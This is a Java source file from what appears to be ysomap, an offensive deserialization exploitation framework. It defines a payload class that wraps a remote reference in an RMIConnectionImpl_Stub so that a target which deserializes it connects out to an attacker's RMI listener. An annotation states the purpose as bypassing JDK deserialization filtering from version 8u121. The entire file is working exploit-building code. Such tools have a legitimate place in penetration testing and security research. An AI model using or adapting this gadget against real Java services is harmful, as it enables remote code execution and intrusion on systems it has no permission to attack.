package ysomap.gadget.payload.rmi;

import sun.rmi.server.UnicastRef;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.jdk.rmi.RMIConnectBullet;
import ysomap.gadget.payload.Payload;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.rmi.Remote;
import java.rmi.server.RemoteRef;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@Require(bullets = {"RMIConnectBullet"})
@SuppressWarnings({"rawtypes"})
@Dependencies({"using to bypass jdk>=8u121","wrapped with RMIConnectionImpl_Stub object"})
@Authors({ Authors.WH1T3P1G })
public class RMIConnectWrapped extends Payload<Remote> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof UnicastRef;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) throws Exception {
        ObjectGadget bullet = new RMIConnectBullet();
        bullet.set("rhost","localhost");
        bullet.set("rport","1099");
        return bullet;
    }

    @Override
    public Remote pack(Object obj) throws Exception {
        // also ok
        // RMIServerImpl_Stub OK
        // RegistryImpl_Stub OK
        // DGCImpl_Stub OK
        // ReferenceWrapper_Stub
        return new RMIConnectionImpl_Stub((RemoteRef) obj);
    }
}
